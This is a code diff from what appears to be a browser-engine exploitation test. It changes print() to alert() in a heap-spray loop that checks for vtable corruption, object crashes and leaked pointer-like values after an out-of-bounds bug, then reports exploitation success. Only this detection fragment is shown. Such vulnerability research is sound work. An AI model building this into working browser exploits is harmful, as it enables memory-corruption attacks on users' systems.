@@ -45,11 +45,11 @@ for (var i = 0; i < spray.length; i++) {
         try {
             var result = arr.target_object.exploit();
             if (result !== 0x42424242) {
-                print(" VTABLE CORRUPTION: spray[" + i + "] returned " + result.toString(16));
+                alert(" VTABLE CORRUPTION: spray[" + i + "] returned " + result.toString(16));
                 exploitation_success = true;
             }
         } catch (e) {
-            print(" OBJECT CORRUPTION: spray[" + i + "] crashed - " + e);
+            alert(" OBJECT CORRUPTION: spray[" + i + "] crashed - " + e);
             exploitation_success = true;
         }
     }
@@ -57,15 +57,15 @@ for (var i = 0; i < spray.length; i++) {
     
     for (var j = 0; j < Math.min(20, arr.length); j++) {
         if (arr[j] >= 0x40000000 && arr[j] <= 0x40000000 + 0x100000) {
-            print(" POINTER-LIKE DATA FOUND: spray[" + i + "][" + j + "] = 0x" + arr[j].toString(16));
+            alert(" POINTER-LIKE DATA FOUND: spray[" + i + "][" + j + "] = 0x" + arr[j].toString(16));
             exploitation_success = true;
         }
     }
 }
 
 if (exploitation_success) {
-    print(" EXPLOITATION TEST SUCCESSFUL!");
-    print("The OOB can reach sensitive objects in mixed heap!");
+    alert(" EXPLOITATION TEST SUCCESSFUL!");
+    alert("The OOB can reach sensitive objects in mixed heap!");
 } else {
-    print("may have some isolation, but less than Libpas");
+    alert("may have some isolation, but less than Libpas");
 }
